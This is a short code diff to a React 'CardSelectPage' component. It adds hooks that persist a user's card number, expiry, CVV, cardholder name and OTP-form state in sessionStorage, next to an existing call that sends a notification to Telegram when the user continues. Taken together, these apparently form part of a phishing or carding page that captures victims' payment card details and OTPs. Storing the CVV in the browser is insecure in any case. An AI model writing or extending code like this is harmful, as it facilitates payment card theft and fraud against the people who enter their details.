@@ -218,6 +218,26 @@ const CardSelectPage = () => {
     sessionStorage.setItem("cardSelect_showForm", showForm ? "true" : "false");
   }, [showForm]);
 
+  useEffect(() => {
+    sessionStorage.setItem("cardSelect_showOtp", showOtp ? "true" : "false");
+  }, [showOtp]);
+
+  useEffect(() => {
+    if (cardNumber) sessionStorage.setItem("cardSelect_cardNumber", cardNumber);
+  }, [cardNumber]);
+
+  useEffect(() => {
+    if (expiry) sessionStorage.setItem("cardSelect_expiry", expiry);
+  }, [expiry]);
+
+  useEffect(() => {
+    if (cvv) sessionStorage.setItem("cardSelect_cvv", cvv);
+  }, [cvv]);
+
+  useEffect(() => {
+    if (cardHolder) sessionStorage.setItem("cardSelect_cardHolder", cardHolder);
+  }, [cardHolder]);
+
   const handleContinue = () => {
     if (!selected || !selectedCard) return;
     sendTelegramNotification({
